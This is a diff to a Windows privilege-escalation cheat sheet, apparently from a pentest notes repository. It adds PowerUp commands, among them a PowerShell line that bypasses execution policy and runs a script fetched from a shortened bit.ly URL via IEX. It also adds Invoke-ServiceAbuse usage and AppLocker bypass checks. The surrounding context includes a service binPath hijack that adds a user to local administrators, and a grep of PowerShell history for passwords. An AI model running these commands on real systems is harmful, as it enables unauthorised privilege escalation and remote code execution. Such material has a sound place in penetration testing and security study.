@@ -337,20 +337,24 @@ cat (Get-PSReadlineOption).HistorySavePath | sls passw
 
 ```bat
 - SeatBelt.exe
+
 - SharpUp.exe
 
 - PowerSploit
 Get-ServiceDetail
 Get-ModifiableService | more
-Invoke-ServiceAbuse
-
 Get-ModifiableServiceFile | more
 Write-ServiceBinary
+
+- PowerUp
+powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/DFgdfez'); Invoke-AllChecks"
+Invoke-ServiceAbuse -Name <service_name> -Username <domain\user>
 ```
 
 ### Manual exploit Binary Path
 
-Find modifiable executable (from SharpUp) and change binary path name 
+Change binary path name
 
 ```bash
 sc config "snmptrap" binPath= "net localgroup administrators <username> /add"
@@ -427,6 +431,7 @@ schtasks /query /fo LIST /v /s <remote_computername>
 schtasks /query /fo LIST 2>nul | findstr TaskName
 schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
 dir C:\windows\tasks
+
 Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
 ```
 
@@ -478,6 +483,12 @@ accesschk.exe -uwcqv "Authenticated Users" *
 accesschk.exe -uwcqv "Users" *
 accesschk.exe -ucqv *
 accesschk.exe -ucqv Spooler
+
+# Applocker exe bypass
+icacls.exe C:\Windows\Tasks
+
+# Applocker dll bypass
+accesschk.exe "<user>" C:\Windows -wus
 
 ```
 > For Windows XP and 2003, use an older version of accesschk :
